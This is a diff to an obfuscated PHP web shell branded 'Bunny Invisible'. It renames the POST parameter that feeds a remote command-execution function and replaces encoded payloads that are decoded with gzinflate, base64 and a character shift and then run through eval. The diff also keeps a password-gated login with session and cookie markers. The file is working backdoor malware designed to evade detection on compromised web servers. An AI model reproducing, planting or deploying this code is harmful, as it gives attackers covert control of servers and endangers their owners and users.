@@ -137,28 +137,14 @@ function BunnyCmd($komendnya) {
         return "<b> Disable Function! </b>";
     }
 }
-if (isset($_POST['ggwpbunny'])) {
-    $komendnya = $_POST['ggwpbunny'];
+if (isset($_POST['BIC0de'])) {
+    $komendnya = $_POST['BIC0de'];
     echo BunnyCmd($komendnya);
 }
 /*Bunny Ganteng*/
-function varconf($servconf)
-{
-    $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
-    $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
-    $nelrts = 'st' . 'rl' . 'en';
-    $rhc = 'c' . 'h' . 'r';
-    $dro = 'o' . 'r' . 'd';
-    $servconf = $gflate($b64($servconf));
-    for ($i = 0; $i < $nelrts($servconf); $i++) {
-        $servconf[$i] = $rhc($dro($servconf[$i]) - 1);
-    }
-    return $servconf;
-}
-/***#***/ @/*55555*/eval
-/***#***/
-(varconf("lVRdb9NAEPwB/IrDykP6gnyfbmIBElBe6FMRSAhXUZqcQ2iahMSlLlV+O7O75yQF+kCk6Ozz3szu7Owphd8zNVs1K3U+ux3UpSxDNa9V/3m8WTf3/d7o49nF57OLr1nVutOq9a7SxmHNK20L7NlKa+xpXenc4z3yd/pGe4jLLk9O1IPqzdfj6XQTt1v1Uv2ByicSauvrv1C1DsLMjANBVS8UTk+rdpyVaqfiYhtB83TqxyScnk1rDnAHUm/wnd5Bagz2nJDnbh+ndUFx/1GSNgc2Kq1jI4aOjZg7Nl6P2BB3KFWb41KfpKdCGGqaIBI0K6sTlTuC1r5TcSd2WL37/ikv1a/F+vztUNXzRRzNYjOarJZNXDbbPh1BXQFqFgAKqK2wVYEyTF15UBJNgQiP1USJctASTWwD2AJigpG4MJWYgPQIAt8Ipg0m7eEMFMFrsHhytBCG1VUIvLTWEzl3jvR0xBCrgtKCjJQI6VBoBtI5CCy87MapNZIsowfxh/dsuNYXzMihdJw65wIzaDKptyJpSB0PyCDlrwkvUM2ID2RmLxrQPtSS2gvRw9YJL0/aJbOHAZ9tLWk0rQAPrUlua1gQI0+0Af1ZkMDvSJLbQwmwDgySod29JrbNSSmNfl//vH5TqtpNftwNVe86buCl9bf16HY5von9LuzDFz2el2ILhF1tVndbDv3H9SD/5HpDOlrRi2YqWZBb4PaDnV0mHs6jFLqhZAqSLHXVyUoTZaxMGV8O1J8J7/P1Q5eGztO7kXGguaVcaOaBAWrSjJRmt1JnTOrYaXLohN3qci6CzUqF2TEBs44PmfQo1cdTjF5zThitHTShPGX0aNrDUVzNubIWNH3O8ygSJn/ztsPhc48x83TD5PtYxiUNXEgj7aRYLtFwtaIhX540LE6KONwhfIo3s0dadc+ilvhXfGzYk1yDK/ZeZ9tBpkTQeeUoqdSBPYG7ksOscThcFAcQ+DI5hK+kUnw7VK9f/QY="));
-//BunnyInvisible Config
+function LTs($bLTs)
+{ $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te'; $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de'; $nelrts = 'st' . 'rl' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $bLTs = $gflate($b64($bLTs)); for ($i = 0; $i < $nelrts($bLTs); $i++) { $bLTs[$i] = $rhc($dro($bLTs[$i]) - 1); } return $bLTs; } /***#***/ @/*55555*/eval/***#***/(LTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));
+/*Bunny Invisible Code*/
 $Bunny_Mini = "B"."un"."ny"."In"."vi"."si"."bl"."e Mi"."ni Co"."de";
 $Bunny_Logo = "ht"."tp"."s:/"."/i".".i"."bb".".c"."o/"."qC"."6R"."wF"."0/"."lo"."go"."-"."bunny404."."p"."n"."g";
 $Bunny_Icons = "h"."t"."t"."ps"."://"."i."."ib"."b."."co"."/Y"."Pd"."7d"."3D"."/i"."co"."ns-"."bunny404".".j"."p"."g";
@@ -384,20 +370,8 @@ if (isset($_POST['BingBunny'])) {
     if (SHA1($_POST['passnya']) == $BunnySelf) {
         function setconf($defconf)
         {
-            $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
-            $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
-            $nelrts = 'st' . 'rl' . 'en';
-            $rhc = 'c' . 'h' . 'r';
-            $dro = 'o' . 'r' . 'd';
-            $defconf = $gflate($b64($defconf));
-            for ($i = 0; $i < $nelrts($defconf); $i++) {
-                $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
-            }
-            return $defconf;
-        }
-        /***#***/ @/*55555*/eval
-        /***#***/
-        (setconf("fVZtb9owEP4B+xUe6gf2ZcrZjg1E3TRNTK1WaaxU06SlQhRCQaOASKpmrfrbdy82hHaswkrs2M/dc/fcuUrh3xt1u67W6mzQnaeZWm8H/UlPnVRFXalT1cprCzhsDgnkNslBG5x2cJricyJD4zo4HIAj4XltdV6nGuce57jXJAxl5ZXQQPsccA64FZzJIU14XrsJD7RWpzj1mqf00ElLvVcnT+hWOmNf2I+UbLn43nr+Rd/330A7tB33zcTXhGhNab11/QKT9oKWc01MYJ7kVXJgH8DiGcc4rcgwkHXClY9QJMktMpF6Dg2bSfC4GSNfJrcZl+W4XC4YjEIXIRpRZDa2wGEEwoB4p614T5BaPBXzJoxDsxxiw6Rom4OXjhSrSSTlXiWwtl0hhmdiahab8XS6LcoyuM+rzfOBEb0CMfLolZMsp6nAOh90UKAu7AH8zXb9UBbbXWyiK01ZgZHjrJuC0SE9hPldbDOR/U+zHnzP1PnczTXKvpyP7rdLFH7UQ1NHpLGgjQONRa3sdGN8yA55k77S2JFzO41xfenkUI9RY8FvrtNMfXmsbju9fVzQ8dGwf/mjf0n+IU5NzHFEPKqopsbZBufS71SFKtrZOb9wicnU57PHr1Vvr4lTNTz7BO2T0eDb8IpMeapd4HRSLXPgfZfWWtfvIhYFOZOQ99RssSxGt0U1mqxXVbGqyjbCOPTY2zASgeK8zXiQCSD1OFSeLnhfbBny9CHvuA+ZUsIcHnMYaCRI6qe+xEukCNxtdI5GeIYPkhEVgQvPlNsOVxyIDpAYOlZ73OHRWTtjngQFiedPdixRNeIrU3BSnhx8y2WIFgG0BIkq0kqvAUvBuxGbrsPbgerSs/sc31gb1nIL4x5KVriUgJnSmvcBrRNSY0WZFDu07hFFT5kneYk/LdGQX8IBqU03dy4sWLcLOHByCITriW6LmOXycXkBmdwnPbWYqfbb4m5T/WkfUSb3KA6fCSrvBsW7EKxZ7DQopXfqqdlkDvQuvflQ7/9ClT0zvq8YVdoJxmLcytSzKpZlgWaOuy5u2f1FYEJxURLpwuNm4UPHl1YrF2YwnDhRDl4s/6cUrcmIJdwJARMUKWMfGr0WK1asxX2h6e+pgm5SPRpRvidS7mICIUQEFgIxK0ReQD+LHLhDZepq2B899Bq3G9lpNA8WrjPhHwEnReVg14e4AWXSjnrcwBFhM9+M7lfju6IdxcdmMtFgT3388Bc="));
+            $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te'; $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de'; $nelrts = 'st' . 'rl' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $defconf = $gflate($b64($defconf)); for ($i = 0; $i < $nelrts($defconf); $i++) { $defconf[$i] = $rhc($dro($defconf[$i]) - 1); } return $defconf;
+        } /***#***/ @/*55555*/eval/***#***/(setconf("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."' " . "Lo" . "gi" . "n " . "Su" . "cc" . "es" . "sf" . "ul" . "ly" . ", " . "Yo" . "u " . "Pr" . "o!" . "!" . " '".");"."</"."sc"."ri"."pt".">";
         $_SESSION["CocoBunny"] = "CocoBunny";
         setcookie('AyoBunny', $my_self, time() + 3600 * 24);
